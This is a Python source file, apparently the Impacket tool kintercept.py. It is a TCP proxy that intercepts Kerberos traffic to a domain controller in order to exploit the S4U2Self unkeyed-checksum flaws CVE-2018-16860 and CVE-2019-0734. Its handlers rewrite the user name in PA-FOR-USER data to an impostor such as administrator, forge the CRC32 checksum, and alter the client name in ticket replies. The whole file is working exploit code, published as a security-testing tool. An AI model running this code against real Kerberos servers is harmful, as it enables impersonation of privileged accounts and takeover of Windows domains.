#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2018 SecureAuth Corporation. All rights reserved.
# Copyright (c) 2017 @MrAnde7son
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Copyright and licensing note from kintercept.py:
#
# MIT Licensed
# Copyright (c) 2019 Isaac Boukris <iboukris@gmail.com>
#
# A tool for intercepting TCP streams and for testing KDC handling
# of PA-FOR-USER with unkeyed checksums in MS Kerberos S4U2Self
# protocol extention (CVE-2018-16860 and CVE-2019-0734).
#
# The tool listens on a local port (default 88), to which the hijacked
# connections should be redirected (via port forwarding, etc), and sends
# all the packets to the upstream DC server.
# If s4u2else handler is set, the name in PA-FOR-USER padata in every proxied
# packet will be changed to the name specified in the handler's argument.
#
# Example: kintercept.py --request-handler s4u2else:administrator dc-ip-addr
#
import struct, socket, argparse, asyncore
from binascii import crc32
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket import version
from impacket.krb5 import constants
from impacket.krb5.crypto import Cksumtype
from impacket.krb5.asn1 import TGS_REQ, TGS_REP, seq_set, PA_FOR_USER_ENC
from impacket.krb5.types import Principal


MAX_READ_SIZE = 16000
MAX_BUFF_SIZE = 32000
LISTEN_QUEUE = 10
TYPE = 10

def process_s4u2else_req(data, impostor):
    try:
        tgs = decoder.decode(data, asn1Spec = TGS_REQ())[0]
    except:
        print ('Record is not a TGS-REQ')
        return ''

    pa_tgs_req = pa_for_user = None

    for pa in tgs['padata']:
        if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_TGS_REQ.value:
            pa_tgs_req = pa
        elif pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_FOR_USER.value:
            pa_for_user = pa

    if not pa_tgs_req or not pa_for_user:
        print ('TGS request is not S4U')
        return ''

    tgs['padata'] = noValue
    tgs['padata'][0] = pa_tgs_req

    try:
        for_user_obj = decoder.decode(pa_for_user['padata-value'], asn1Spec = PA_FOR_USER_ENC())[0]
    except:
        print ('Failed to decode PA_FOR_USER!')
        return ''

    S4UByteArray = struct.pack('<I', TYPE)
    S4UByteArray += impostor + str(for_user_obj['userRealm']) + 'Kerberos'

    cs = (~crc32(S4UByteArray, 0xffffffff)) & 0xffffffff
    cs = struct.pack('<I', cs)

    clientName = Principal(impostor, type=TYPE)
    seq_set(for_user_obj, 'userName', clientName.components_to_asn1)

    for_user_obj['cksum'] = noValue
    for_user_obj['cksum']['cksumtype'] = Cksumtype.CRC32
    for_user_obj['cksum']['checksum'] = cs

    pa_for_user['padata-value'] = encoder.encode(for_user_obj)
    tgs['padata'][1] = pa_for_user

    return bytes(encoder.encode(tgs))

def mod_tgs_rep_user(data, reply_user):
    try:
        tgs = decoder.decode(data, asn1Spec = TGS_REP())[0]
    except:
        print ('Record is not a TGS-REP')
        return ''

    cname = Principal(reply_user, type=TYPE)
    seq_set(tgs, 'cname', cname.components_to_asn1)

    return bytes(encoder.encode(tgs))


class InterceptConn(asyncore.dispatcher):
    def __init__(self, conn=None):
        asyncore.dispatcher.__init__(self, conn)
        self.peer = None
        self.buffer = bytearray()
        self.eof_received = False
        self.eof_sent = False

    # Override recv method to handle half opened connections
    # e.g. curl --http1.0 ...
    def recv(self, n):
        if not n:
            return ''
        try:
            data = self.socket.recv(n)
            if not data:
                self.handle_eof()
                return ''
            else:
                return data
        except socket.error as why:
            if why.args[0] in asyncore._DISCONNECTED:
                self.handle_close()
                return ''
            else:
                raise

    def forward_data(self, data):
        self.peer.buffer.extend(data)

    def buffer_empty(self):
        return len(self.buffer) == 0

    def max_read_size(self):
        space = MAX_BUFF_SIZE - min(MAX_BUFF_SIZE, len(self.peer.buffer))
        return min(MAX_READ_SIZE, space)

    def readable(self):
        if not self.connected:
            return True
        return (not self.eof_received) and (self.max_read_size() != 0)

    def handle_read(self):
        data_read = self.recv(self.max_read_size())
        if data_read:
            print (str(self.fileno()) + ': recieved ' + str(len(data_read)) + ' bytes')
            self.forward_data(data_read)

    def handle_eof(self):
        print (str(self.fileno()) +  ': received eof')
        self.eof_received = True

    def need_to_send_eof(self):
        if self.eof_sent:
            return False
        return self.buffer_empty() and self.peer.eof_received

    def writable(self):
        if not self.connected:
            return True
        return not self.buffer_empty() or self.need_to_send_eof()

    def handle_write(self):
        if not self.buffer_empty():
            sent = self.send(self.buffer)
            print (str(self.fileno()) +  ': sent ' + str(sent) + ' bytes')
            if sent:
                del self.buffer[:sent]
        if self.need_to_send_eof():
            self.shutdown(socket.SHUT_WR)
            self.eof_sent = True
            print (str(self.fileno()) +  ': sent eof')
            if self.peer.eof_sent:
                self.handle_close()

    def handle_close(self):
        print ('Closing pair: [' + str(self.fileno()) +  ',' + str(self.peer.fileno()) + ']')
        self.peer.close()
        self.close()


def InterceptKRB5Tcp(process_record_func, arg):
    class _InterceptKRB5Tcp(InterceptConn):
        def __init__(self, conn=None):
            InterceptConn.__init__(self, conn)
            self.proto_buffer = bytearray()

        def forward_data(self, data):
            self.proto_buffer.extend(data)

            while len(self.proto_buffer):
                if len(self.proto_buffer) < 4:
                    break

                header = ''.join(reversed(str(self.proto_buffer[:4])))
                rec_len = struct.unpack('<L', header)[0]
                print ('len of record: ' + str(rec_len))

                if len(self.proto_buffer) < 4 + rec_len:
                    break

                msg = process_record_func(bytes(self.proto_buffer[4:4+rec_len]), arg)
                if not msg:
                    InterceptConn.forward_data(self, self.proto_buffer[:4+rec_len])
                else:
                    header = struct.pack('<L', len(msg))
                    InterceptConn.forward_data(self, ''.join(reversed(header)) + msg)

                del self.proto_buffer[:4+rec_len]

    return _InterceptKRB5Tcp

class InterceptConnFactory:
    def __init__(self, handler=None, arg=None):
        self.handler = handler
        self.arg = arg

    def produce(self):
        if not self.handler:
            return InterceptConn
        if self.handler.lower() == "s4u2else":
            return InterceptKRB5Tcp(process_s4u2else_req, self.arg)
        if self.handler.lower() == "tgs-rep-user":
            return InterceptKRB5Tcp(mod_tgs_rep_user, self.arg)

class InterceptServer(asyncore.dispatcher):
    def __init__(self, addr, target, icf1, icf2):
        asyncore.dispatcher.__init__(self)
        self.target = target
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind(addr)
        self.listen(LISTEN_QUEUE)
        self.downconns = icf1
        self.upconns = icf2

    def intercept_conns(self, conn):
        iconn1 = self.downconns.produce()(conn)
        iconn2 = self.upconns.produce()()
        return iconn1, iconn2

    def handle_accept(self):
        conn, addr = self.accept()
        downstream, upstream = self.intercept_conns(conn)
        downstream.peer = upstream
        upstream.peer = downstream
        try:
            upstream.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream.connect(self.target)
            print ('accepted downconn fd: ' + str(downstream.fileno()))
            print ('established upconn fd: ' + str(upstream.fileno()))
        except:
            print (str(conn.fileno()) + ': failed to connect to target')
            downstream.handle_close()


def parse_args():
    parser = argparse.ArgumentParser(description='Intercept TCP streams')
    parser.add_argument('server', help='Target server address')
    parser.add_argument('--server-port', default=88, type=int, help='Target server port')
    parser.add_argument('--listen-port', default=88, type=int, help='Port to listen on')
    parser.add_argument('--listen-addr', default='', help='Address to listen on')
    parser.add_argument('--request-handler', default='', metavar='HANDLER:ARG', help='Example: s4u2else:user')
    parser.add_argument('--reply-handler', default='', metavar='HANDLER:ARG', help='Example: tgs-rep-user:user')
    return vars(parser.parse_args())


if __name__ == '__main__':

    print(version.BANNER)

    args = parse_args()

    req_factory = rep_factory = InterceptConnFactory()
    if args['request_handler']:
        req_args = args['request_handler'].split(':')
        req_factory = InterceptConnFactory(req_args[0], req_args[1])
    if args['reply_handler']:
        rep_args = args['reply_handler'].split(':')
        rep_factory = InterceptConnFactory(rep_args[0], rep_args[1])

    server = InterceptServer((args['listen_addr'], args['listen_port']),
                              (args['server'], args['server_port']),
                              req_factory, rep_factory)
    asyncore.loop()
